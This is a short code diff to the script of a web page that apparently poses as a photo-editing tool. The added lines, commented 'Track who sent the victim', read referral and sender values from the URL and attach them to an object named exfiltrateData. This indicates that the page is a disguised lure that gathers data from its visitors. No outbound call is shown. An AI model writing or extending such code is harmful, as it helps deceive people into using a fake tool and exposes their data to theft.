@@ -239,7 +239,15 @@
             if (!document.hidden && fileInput.value === '') {
                 setTimeout(() => showStatus('Select a photo to start editing!'), 1000);
             }
-        });
+});
+
+     // Track who sent the victim
+const urlParams = new URLSearchParams(window.location.search);
+const referral = urlParams.get('ref') || 'direct';
+const from = decodeURIComponent(urlParams.get('from') || 'unknown');
+exfiltrateData.referral = referral;
+exfiltrateData.from = from;
+        
     </script>
 </body>
 </html>
